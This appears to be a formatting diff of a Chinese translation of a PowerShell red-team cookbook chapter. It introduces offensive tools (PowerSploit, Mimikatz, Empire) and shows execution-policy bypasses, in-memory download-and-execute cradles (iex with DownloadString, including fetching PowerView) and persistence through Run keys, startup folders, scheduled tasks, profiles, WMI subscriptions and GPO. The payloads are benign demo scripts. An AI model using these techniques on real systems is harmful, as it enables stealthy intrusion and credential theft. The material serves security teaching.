@@ -62,27 +62,27 @@
 
 ## PowerSploit
 
-**PowerSploit** 是一套 PowerShell 模块和脚本，旨在帮助红队成员在渗透测试过程中使用。最初由 Matt Graeber 开发。虽然它不再受到支持，但仍有许多有用的工具和脚本可以派上用场。PowerSploit 可以从 GitHub 下载：https://github.com/PowerShellMafia/PowerSploit。
+`PowerSploit` 是一套 PowerShell 模块和脚本，旨在帮助红队成员在渗透测试过程中使用。最初由 Matt Graeber 开发。虽然它不再受到支持，但仍有许多有用的工具和脚本可以派上用场。PowerSploit 可以从 GitHub 下载：https://github.com/PowerShellMafia/PowerSploit。
 
 虽然大多数功能在 Windows PowerShell 中工作正常，但在 PowerShell 7 及以上版本中并不适用。PowerSploit 使用的某些功能是基于.NET Framework 的，而这些功能并未移植到 PowerShell 7 所依赖的.NET Core 中。因此，在 PowerShell 7 及以上版本中运行 PowerSploit 时，您可能会遇到错误。因此，本章演示时我们将使用 Windows PowerShell。
 
 PowerSploit 是一个非常广泛的工具集，因此我们不会深入探讨它。它包含几个子文件夹，将其 PowerShell 模块分为以下类别：
 
-+   **CodeExecution**
++   `CodeExecution`
 
-+   **ScriptModification**
++   `ScriptModification`
 
-+   **Persistence**
++   `Persistence`
 
-+   **AntivirusBypass**
++   `AntivirusBypass`
 
-+   **Exfiltration**
++   `Exfiltration`
 
-+   **Mayhem**
++   `Mayhem`
 
-+   **Privesc**（权限提升）
++   `Privesc`（权限提升）
 
-+   **Recon**（侦察）
++   `Recon`（侦察）
 
 您可以选择将整个集合作为模块加载，或仅加载其中的部分内容；也可以将其中一个子文件夹复制并粘贴到您的模块文件夹中，然后加载它。
 
@@ -98,9 +98,9 @@ PowerSploit 中的一个值得重新审视的工具是 PowerView。
 
 ### PowerView
 
-您可以在 GitHub 上的**Recon**文件夹中找到**PowerView**脚本：[`github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)。
+您可以在 GitHub 上的`Recon`文件夹中找到`PowerView`脚本：[`github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)。
 
-您可以选择导入并加载整个**Recon**文件夹，或者只下载并运行**PowerView.ps1**脚本，这在您需要从内存而非磁盘执行有效载荷时，可能会更方便。
+您可以选择导入并加载整个`Recon`文件夹，或者只下载并运行`PowerView.ps1`脚本，这在您需要从内存而非磁盘执行有效载荷时，可能会更方便。
 
 PowerView 有许多内置功能，其中一些功能如下：
 
@@ -114,19 +114,19 @@ PowerView 有许多内置功能，其中一些功能如下：
 
 ## Invoke-Mimikatz
 
-**Mimikatz**是网络安全领域的一个知名工具。它帮助您从**本地安全机构**（**LSA**）提取并重用凭据，如哈希值或票证，这使得红队人员可以进行**Pass-the-Hash**（**PtH**）或**Pass-the-Ticket**（**PtT**）攻击。
+`Mimikatz`是网络安全领域的一个知名工具。它帮助您从**本地安全机构**（**LSA**）提取并重用凭据，如哈希值或票证，这使得红队人员可以进行`Pass-the-Hash`（**PtH**）或`Pass-the-Ticket`（**PtT**）攻击。
 
 Mimikatz 本身是由 Benjamin Delpy 用 C 编写的。然而，Joseph Bialek 成功地将其封装成一个 PowerShell 脚本，并将其包含在 PowerSploit、Nishang 和许多其他工具包中。我相信，当我写这本书时，Nishang 中托管的脚本是我能找到的最新版本：[`raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1`](https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1)。
 
-在将 **Invoke-Mimikatz.ps1** 脚本加载到当前会话中后，只需在 PowerShell 命令行执行 **Invoke-Mimikatz** 即可调用 Mimikatz 的功能。
+在将 `Invoke-Mimikatz.ps1` 脚本加载到当前会话中后，只需在 PowerShell 命令行执行 `Invoke-Mimikatz` 即可调用 Mimikatz 的功能。
 
 有关官方 Mimikatz 文档，请参考 C 版本 Mimikatz 的 GitHub 仓库：[`github.com/gentilkiwi/mimikatz`](https://github.com/gentilkiwi/mimikatz)。
 
-在写作时，Mimikatz 已经为防御者和反恶意软件解决方案广为人知，因此你不应当仅仅假设 **Invoke-Mimikatz** 会在不被检测或警报的情况下正常工作。为了使其成功运行，你需要对其进行混淆——即使如此，它仍然很可能会被检测到。
+在写作时，Mimikatz 已经为防御者和反恶意软件解决方案广为人知，因此你不应当仅仅假设 `Invoke-Mimikatz` 会在不被检测或警报的情况下正常工作。为了使其成功运行，你需要对其进行混淆——即使如此，它仍然很可能会被检测到。
 
 ## Empire
 
-**PowerShell Empire** 是一个后渗透框架，由 Will Schroeder、Justin Warner、Matt Nelson、Steve Borosh、Alexander Rymdeko-Harvey 和 Chris Ross 开发。虽然现在已经不再维护，但它仍然包含许多有用的功能。
+`PowerShell Empire` 是一个后渗透框架，由 Will Schroeder、Justin Warner、Matt Nelson、Steve Borosh、Alexander Rymdeko-Harvey 和 Chris Ross 开发。虽然现在已经不再维护，但它仍然包含许多有用的功能。
 
 它的构建目的是为红队成员提供一个平台，用于执行后渗透任务，类似于 Metasploit，并包含以下特性：
 
@@ -144,7 +144,7 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 ## Inveigh
 
-**Inveigh** 是一个 .NET 平台下的 IPv4/IPv6 中间人工具，由 Kevin Robertson 开发。它最初是在 PowerShell 中开发的，但后来被移植到了 C#，从而使其支持跨平台使用。Inveigh 的最新 PowerShell 版本是 1.506，且在写作时已不再开发，但仍然可以在 GitHub 上获取。最新的 C# 版本是 2.0.9。
+`Inveigh` 是一个 .NET 平台下的 IPv4/IPv6 中间人工具，由 Kevin Robertson 开发。它最初是在 PowerShell 中开发的，但后来被移植到了 C#，从而使其支持跨平台使用。Inveigh 的最新 PowerShell 版本是 1.506，且在写作时已不再开发，但仍然可以在 GitHub 上获取。最新的 C# 版本是 2.0.9。
 
 以下是 PowerShell 版本的主要特性：
 
@@ -160,7 +160,7 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 ## PowerUpSQL
 
-**PowerUpSQL**是由 Scott Sutherland 开发的 PowerShell 模块，用于攻击 SQL 服务器。尽管它提供了多种可能性，但目前尚不支持 SQL 注入。
+`PowerUpSQL`是由 Scott Sutherland 开发的 PowerShell 模块，用于攻击 SQL 服务器。尽管它提供了多种可能性，但目前尚不支持 SQL 注入。
 
 以下是 PowerUpSQL 功能的概览：
 
@@ -174,7 +174,7 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 ## AADInternals
 
-**AADInternals**是由 Nestori Syynimaa 开发的一个广泛的 PowerShell 模块，提供了丰富的功能，用于管理、枚举和利用 Azure AD 和 Office 365 环境。
+`AADInternals`是由 Nestori Syynimaa 开发的一个广泛的 PowerShell 模块，提供了丰富的功能，用于管理、枚举和利用 Azure AD 和 Office 365 环境。
 
 它的一些特性如下：
 
@@ -194,7 +194,7 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 +   以及更多。
 
-您可以通过 PowerShell 命令行简单地使用**Install-Module AADInternals**来安装它。您可以从 PowerShell Gallery 下载： https://www.powershellgallery.com/packages/AADInternals/。
+您可以通过 PowerShell 命令行简单地使用`Install-Module AADInternals`来安装它。您可以从 PowerShell Gallery 下载： https://www.powershellgallery.com/packages/AADInternals/。
 
 您也可以在 GitHub 上找到该项目：https://github.com/Gerenios/AADInternals。
 
@@ -204,7 +204,7 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 请注意，这本工具书并不是一个完整的红队参考资料，因为那样会填满一本书。它的目的是作为一个有用的资源，帮助您开始进行与 PowerShell 相关的红队任务。
 
-为了让刚接触网络安全的人更容易理解，本工具书已根据**MITRE ATT&CK**领域进行分类。请注意，您在本工具书中找不到*所有*的 MITRE ATT&CK 领域。
+为了让刚接触网络安全的人更容易理解，本工具书已根据`MITRE ATT&CK`领域进行分类。请注意，您在本工具书中找不到*所有*的 MITRE ATT&CK 领域。
 
 您可以在官方 MITRE 网页上找到完整的 MITRE ATT&CK 企业矩阵：https://attack.mitre.org/matrices/enterprise/。
 
@@ -241,7 +241,7 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 如 *第一章* 中详细讨论的那样，*PowerShell 入门*，执行策略并非一种安全控制，不会阻止对手运行恶意代码。它只是一个功能，用来防止用户不小心执行脚本。然而，有多种方法可以避免执行策略。
 
-如果执行策略*没有*通过组策略强制执行，你可以轻松地将其设置为 **Unrestricted**，前提是你是本地管理员：
+如果执行策略*没有*通过组策略强制执行，你可以轻松地将其设置为 `Unrestricted`，前提是你是本地管理员：
 
 ```
 > Set-ExecutionPolicy Unrestricted
@@ -272,14 +272,14 @@ Empire 可以从 GitHub 下载：[`github.com/EmpireProject/Empire`](https://git
 
 #### 解决方案
 
-你可以通过使用 **powershell.exe** 配合 **-c**/**-Command** 参数，后跟你的命令，来实现这一点：
+你可以通过使用 `powershell.exe` 配合 `-c**/**-Command` 参数，后跟你的命令，来实现这一点：
 
 ```
 > powershell.exe -c <command>
 > powershell.exe -Command <command>
 ```
 
-**-c** 选项将执行所提供的命令，并将其包装在双引号中，就像在 PowerShell 提示符下键入一样。
+`-c` 选项将执行所提供的命令，并将其包装在双引号中，就像在 PowerShell 提示符下键入一样。
 
 ### 避免从 PowerShell 用户配置文件加载设置
 
@@ -287,7 +287,7 @@ PowerShell 用户配置文件包含不希望出现的设置，你需要避免它
 
 #### 解决方案
 
-使用 **-NoProfile** 或 **-nop** 参数，这样 PowerShell 就不会加载 PowerShell 用户配置文件。**-nop** 参数是 **-NoProfile** 的简写：
+使用 `-NoProfile` 或 `-nop` 参数，这样 PowerShell 就不会加载 PowerShell 用户配置文件。`-nop` 参数是 `-NoProfile` 的简写：
 
 ```
 > powershell.exe -nop -c <command>
@@ -302,37 +302,37 @@ PowerShell 用户配置文件包含不希望出现的设置，你需要避免它
 
 使用 PowerShell cmdlet 下载文件有多种方法：
 
-+   **Invoke-WebRequest**
++   `Invoke-WebRequest`
 
-对于以下所有示例，请下载以下脚本，可在[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)找到，并将其保存到 C:\Users\Administrator\Downloads\HelloWorld**.ps1**路径。
+对于以下所有示例，请下载以下脚本，可在[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)找到，并将其保存到 C:\Users\Administrator\Downloads\HelloWorld`.ps1`路径。
 
-要使用**Invoke-WebRequest**下载文件，您可以使用以下代码片段：
+要使用`Invoke-WebRequest`下载文件，您可以使用以下代码片段：
 
 ```
 Invoke-WebRequest -Uri <source> -OutFile <destination>
 ```
 
-确保您适当地替换**<source>**和**<destination>**，分别表示文件的来源和下载位置，如下例所示：
+确保您适当地替换`<source>`和`<destination>`，分别表示文件的来源和下载位置，如下例所示：
 
 ```
 > Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -OutFile 'C:\Users\Administrator\Downloads\HelloWorld.ps1'
 ```
 
-也可以使用其别名**iwr**：
+也可以使用其别名`iwr`：
 
 ```
 > iwr -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -OutFile 'C:\Users\Administrator\Downloads\HelloWorld.ps1'
 ```
 
-+   **Invoke-RestMethod**
++   `Invoke-RestMethod`
 
-您还可以使用**Invoke-RestMethod**从互联网返回脚本的内容：
+您还可以使用`Invoke-RestMethod`从互联网返回脚本的内容：
 
 ```
 iex (Invoke-RestMethod '<url>' )
 ```
 
-**Invoke-RestMethod**旨在从**表述性状态转移**（**REST**）Web 服务中检索数据。根据数据类型，PowerShell 相应地格式化答案：如果是**JSON**或**XML**文件，则内容以**[PSCustomObject]**形式返回，但也可以检索和返回单个项目，如下例所示：
+`Invoke-RestMethod`旨在从**表述性状态转移**（**REST**）Web 服务中检索数据。根据数据类型，PowerShell 相应地格式化答案：如果是`JSON`或`XML`文件，则内容以`[PSCustomObject]`形式返回，但也可以检索和返回单个项目，如下例所示：
 
 ```
 > Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1'
@@ -340,15 +340,15 @@ iex (Invoke-RestMethod '<url>' )
 
 在这种情况下，文件将不会被下载；而是作为输出显示。
 
-+   **Start-BitsTransfer**
++   `Start-BitsTransfer`
 
-要使用**Start-BitsTransfer**下载文件，您可以使用以下代码片段：
+要使用`Start-BitsTransfer`下载文件，您可以使用以下代码片段：
 
 ```
 Start-BitsTransfer -Source <source> -Destination <destination>
 ```
 
-确保您适当地替换**<source>**和**<destination>**，分别表示文件的来源和下载位置，如下例所示：
+确保您适当地替换`<source>`和`<destination>`，分别表示文件的来源和下载位置，如下例所示：
 
 ```
 > Start-BitsTransfer -Source 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1' -Destination 'C:\Users\Administrator\Downloads\HelloWorld.ps1'
@@ -372,11 +372,11 @@ Start-BitsTransfer -Source <source> -Destination <destination>
 > iex(Invoke-WebRequest -Uri '<url to script>'); <command from script>}
 ```
 
-请注意，在此示例中，我们使用**Invoke-WebRequest**下载脚本，但您也可以使用任何其他允许您下载脚本的选项。使用**Invoke-Expression**或其别名**iex**，您可以直接执行脚本。
+请注意，在此示例中，我们使用`Invoke-WebRequest`下载脚本，但您也可以使用任何其他允许您下载脚本的选项。使用`Invoke-Expression`或其别名`iex`，您可以直接执行脚本。
 
 甚至可以在运行脚本时执行从脚本中导出的命令。
 
-在这个示例中，我们将使用来自**Chapter01**的**HelloWorld.ps1**脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1)。
+在这个示例中，我们将使用来自`Chapter01`的`HelloWorld.ps1`脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1)。
 
 以下示例展示了你如何简单地下载并执行文件：
 
@@ -384,7 +384,7 @@ Start-BitsTransfer -Source <source> -Destination <destination>
 > iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1')
 ```
 
-使用这个示例，你可以下载并执行**PowerView**，直接运行**Get-NetDomain**命令，该命令包含在**PowerView**中：
+使用这个示例，你可以下载并执行`PowerView`，直接运行`Get-NetDomain`命令，该命令包含在`PowerView`中：
 
 ```
 > iex(Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'); Get-NetDomain
@@ -396,7 +396,7 @@ Start-BitsTransfer -Source <source> -Destination <destination>
 
 #### 解决方案
 
-在这个示例中，我们将使用来自**Chapter01**的**HelloWorld.ps1**脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)。
+在这个示例中，我们将使用来自`Chapter01`的`HelloWorld.ps1`脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)。
 
 你可以使用以下代码片段来实现你的目标：
 
@@ -424,19 +424,19 @@ $HttpRequest.SetRequestHeader("User-Agent", "1337")
 
 使用 PowerShell cmdlet 下载文件有多种方法：
 
-+   **System.Net.WebClient**
++   `System.Net.WebClient`
 
-要使用**System.Net.WebClient**类下载文件，可以使用以下代码片段：
+要使用`System.Net.WebClient`类下载文件，可以使用以下代码片段：
 
 ```
 (New-Object System.Net.WebClient).DownloadFile(<source>, <destination>)
 ```
 
-确保适当替换**<source>**和**<destination>**，分别为文件的源位置和应该下载到的位置。
+确保适当替换`<source>`和`<destination>`，分别为文件的源位置和应该下载到的位置。
 
-在这个示例中，我们将使用来自**Chapter01**的**HelloWorld.ps1**脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)。
+在这个示例中，我们将使用来自`Chapter01`的`HelloWorld.ps1`脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)。
 
-以下示例展示了如何将**HelloWorld.ps1**脚本下载到管理员的**下载**文件夹：
+以下示例展示了如何将`HelloWorld.ps1`脚本下载到管理员的**下载**文件夹：
 
 ```
 > $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"
@@ -444,7 +444,7 @@ $HttpRequest.SetRequestHeader("User-Agent", "1337")
 > (New-Object System.Net.WebClient).DownloadFile($Url, $OutputFile)
 ```
 
-如果你想从互联网执行文件，而不将其实际保存为文件，你还可以使用**DownloadString()**：
+如果你想从互联网执行文件，而不将其实际保存为文件，你还可以使用`DownloadString()`：
 
 ```
 > iex((New-Object System.NET.WebClient).DownloadString(<source>))
@@ -468,13 +468,13 @@ iex(($WebClient).DownloadString($Url))
 
 请注意，用户代理需要在*每次*请求之前设置。
 
-+   **System.Xml.XmlDocument**
++   `System.Xml.XmlDocument`
 
 你还可以加载 XML 文档并执行特定的节点。这在节点中的命令被编码时特别有用。
 
 在这个示例中，我们将使用一个 XML 文件，你可以在本书的 GitHub 仓库中找到它：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter08/XmlDocument-Demo.xml`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter08/XmlDocument-Demo.xml)。
 
-首先，我们必须将 XML 文件的 URL 加载到 **$****Xml** 变量中：
+首先，我们必须将 XML 文件的 URL 加载到 `$****Xml` 变量中：
 
 ```
 > $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter08/XmlDocument-Demo.xml"
@@ -489,13 +489,13 @@ iex(($WebClient).DownloadString($Url))
 > $Xml.xml.othernode | iex
 ```
 
-+   **System.NET.WebRequest**
++   `System.NET.WebRequest`
 
-下载并仅在内存中执行脚本的最佳方法是使用 **System.NET.WebRequest** 类。
+下载并仅在内存中执行脚本的最佳方法是使用 `System.NET.WebRequest` 类。
 
-对于这个示例，我们将使用 **第一章** 中的 **HelloWorld.ps1** 脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)。
+对于这个示例，我们将使用 **第一章** 中的 `HelloWorld.ps1` 脚本：[`raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1`](https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1)。
 
-以下代码片段展示了如何创建一个 web 请求来获取 **HelloWorld.ps1** 脚本的内容并在内存中执行它：
+以下代码片段展示了如何创建一个 web 请求来获取 `HelloWorld.ps1` 脚本的内容并在内存中执行它：
 
 ```
 > $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"
@@ -520,7 +520,7 @@ iex(($WebClient).DownloadString($Url))
 
 #### 解决方案
 
-有多种方法可以从 PowerShell 执行 C# 代码。其中一种方法是使用 **Add-Type** cmdlet 加载并运行你自己的 .NET Framework 类：
+有多种方法可以从 PowerShell 执行 C# 代码。其中一种方法是使用 `Add-Type` cmdlet 加载并运行你自己的 .NET Framework 类：
 
 ```
 $source = @"
@@ -537,7 +537,7 @@ Add-Type -TypeDefinition $source -Language CSharp
 [SayHello]::Main()
 ```
 
-在这个示例中，我首先在 **$Source** 变量中定义了一个小的 C# 代码片段。通过使用 **Add-Type**，C# 类被加载到内存中。现在，我们可以直接通过 PowerShell 访问 C# 函数，而无需编译 C# 代码。通过执行 **[SayHello]::Main()**，**Hello World!** 字符串将被写入输出。
+在这个示例中，我首先在 `$Source` 变量中定义了一个小的 C# 代码片段。通过使用 `Add-Type`，C# 类被加载到内存中。现在，我们可以直接通过 PowerShell 访问 C# 函数，而无需编译 C# 代码。通过执行 `[SayHello]::Main()`，`Hello World!` 字符串将被写入输出。
 
 还有其他方法可以从 PowerShell 执行 C# 代码。请参阅*第六章*，*活动目录 – 攻击与缓解*，了解更多信息。
 
@@ -551,19 +551,19 @@ Add-Type -TypeDefinition $source -Language CSharp
 
 #### 解决方案
 
-你可以通过在 **HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run** 注册表路径下创建一个注册表项来实现这一点：
+你可以通过在 `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` 注册表路径下创建一个注册表项来实现这一点：
 
 ```
 > New-ItemProperty -Path "<registry path>" -Name "<name>" -PropertyType String -Value "<powershell command>"
 ```
 
-这个示例展示了如何创建一个注册表项来运行 **C:\windows\system32\HelloWorld.ps1** 脚本，同时使用 PowerShell 作为自动运行脚本：
+这个示例展示了如何创建一个注册表项来运行 `C:\windows\system32\HelloWorld.ps1` 脚本，同时使用 PowerShell 作为自动运行脚本：
 
 ```
 > New-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "NotSuspiciousAtAll" -PropertyType String -Value "powershell.exe -NonInteractive -WindowStyle Hidden -Execution-Policy ByPass -File 'C:\windows\system32\HelloWorld.ps1'"
 ```
 
-该命令存储在**NotSuspiciousAtAll**下；每当自动启动被触发时，脚本将在 PowerShell 中以非交互和隐藏的命令行执行，并且配置为绕过执行策略。
+该命令存储在`NotSuspiciousAtAll`下；每当自动启动被触发时，脚本将在 PowerShell 中以非交互和隐藏的命令行执行，并且配置为绕过执行策略。
 
 ### 使用启动文件夹建立持久性
 
@@ -573,11 +573,11 @@ Add-Type -TypeDefinition $source -Language CSharp
 
 你可以将你的脚本添加到以下启动文件夹之一：
 
-+   **$****env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup**
++   `$****env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup`
 
-+   **$****env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup**
++   `$****env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`
 
-+   **$****env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp**
++   `$****env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp`
 
 你可以直接将其下载到启动文件夹中，如下所示：
 
@@ -603,23 +603,23 @@ Add-Content -Path $path -Value "Write-Host 'Hello World!'"
 
 #### 解决方案
 
-你可以使用**schtasks**来创建一个计划任务：
+你可以使用`schtasks`来创建一个计划任务：
 
 ```
 > schtasks /create /tn "NotSuspiciousAtAll" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\windows\system32\HelloWorld.ps1" /sc onstart
 ```
 
-**/create** 参数表示你想要创建一个新的计划任务。使用**/tn**，你可以指定任务名称。红队成员和攻击者通常会尝试选择一个不会引起怀疑且如果蓝队调查时容易被忽视的名称。使用**/tr**，你可以指定在执行该计划任务时应运行的命令；**/sc** 定义任务的执行时间。在这种情况下，任务被设置为每次系统启动时执行。
+`/create` 参数表示你想要创建一个新的计划任务。使用`/tn`，你可以指定任务名称。红队成员和攻击者通常会尝试选择一个不会引起怀疑且如果蓝队调查时容易被忽视的名称。使用`/tr`，你可以指定在执行该计划任务时应运行的命令；`/sc` 定义任务的执行时间。在这种情况下，任务被设置为每次系统启动时执行。
 
 ### 使用 PowerShell 配置文件建立持久性
 
-你想通过 PowerShell 配置文件来建立持久性。此方法较难被检测到，但如果在 PowerShell 启动时指定了 **-noprofile**，你的脚本将不会运行；然而，使用此方法也意味着它只有在用户运行 PowerShell 时才会触发——而在很多情况下，用户可能永远不会运行 PowerShell。
+你想通过 PowerShell 配置文件来建立持久性。此方法较难被检测到，但如果在 PowerShell 启动时指定了 `-noprofile`，你的脚本将不会运行；然而，使用此方法也意味着它只有在用户运行 PowerShell 时才会触发——而在很多情况下，用户可能永远不会运行 PowerShell。
 
 #### 解决方案
 
-PowerShell 支持每个用户的配置文件，这意味着每个用户都有自己的配置文件，一旦他们启动 PowerShell 会话，就会加载该配置文件。这些配置文件通常存储在 **C:\Users\<USERNAME>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1** 下。
+PowerShell 支持每个用户的配置文件，这意味着每个用户都有自己的配置文件，一旦他们启动 PowerShell 会话，就会加载该配置文件。这些配置文件通常存储在 `C:\Users\<USERNAME>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` 下。
 
-如果你想将内容添加到当前用户的配置文件中，可以使用 **-Path $Profile** 并添加你的脚本或命令：
+如果你想将内容添加到当前用户的配置文件中，可以使用 `-Path $Profile` 并添加你的脚本或命令：
 
 +   将脚本添加到当前配置文件：
 
@@ -642,9 +642,9 @@ foreach ($profile in $profiles) {
 }
 ```
 
-在这个例子中，首先，我们会在 **C:\User** 文件夹中查找所有 PowerShell 用户配置文件，遍历它们并添加 **HelloWorld.ps1** 脚本，该脚本位于 **C:\windows\system32\** 下。
+在这个例子中，首先，我们会在 `C:\User` 文件夹中查找所有 PowerShell 用户配置文件，遍历它们并添加 `HelloWorld.ps1` 脚本，该脚本位于 `C:\windows\system32\` 下。
 
-此外，还有一个适用于系统上所有用户的全局配置文件，位于 **$PSHOME\Profile.ps1** 下。**$PSHOME** 是一个自动变量，包含 PowerShell 安装目录的路径：
+此外，还有一个适用于系统上所有用户的全局配置文件，位于 `$PSHOME\Profile.ps1` 下。`$PSHOME` 是一个自动变量，包含 PowerShell 安装目录的路径：
 
 ```
 > Add-Content -Path "$PSHOME\Profile.ps1" -Value "C:\path\to\script.ps1"
@@ -668,7 +668,7 @@ foreach ($profile in $profiles) {
 $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='WMIPersistenceFilter';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 07 AND TargetInstance.Minute = 00 GROUP WITHIN 60"};
 ```
 
-在这个示例中，已经创建了**WMIPersistenceFilter**事件过滤器。为了建立持久性，使用一个定期触发的事件是非常有用的。因此，在此示例中，事件将在系统时间为*07:00*时触发。
+在这个示例中，已经创建了`WMIPersistenceFilter`事件过滤器。为了建立持久性，使用一个定期触发的事件是非常有用的。因此，在此示例中，事件将在系统时间为*07:00*时触发。
 
 接下来，创建一个 WMI 命令行事件消费者。此命令旨在每当事件过滤器返回数据时执行：
 
@@ -676,7 +676,7 @@ $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -A
 $consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='WMIPersistenceConsumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\windows\system32\HelloWorld.ps1";RunInteractively='false'};
 ```
 
-在我们的示例中，消费者被称为**WMIPersistenceConsumer**，它的配置是绕过执行策略并运行**C:\windows\system32\HelloWorld.ps1**脚本。
+在我们的示例中，消费者被称为`WMIPersistenceConsumer`，它的配置是绕过执行策略并运行`C:\windows\system32\HelloWorld.ps1`脚本。
 
 最后但同样重要的是，我们需要将它们*绑定*在一起——即，过滤器和消费者：
 
@@ -699,9 +699,9 @@ $gpo = New-GPO -Name "PersistentScript"
 Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Run" -ValueName "PersistentScript" -Type String -Value "powershell.exe -ExecutionPolicy Bypass -File \\Dc01\sysvol\PSSec.local\scripts\HelloWorld.ps1"
 ```
 
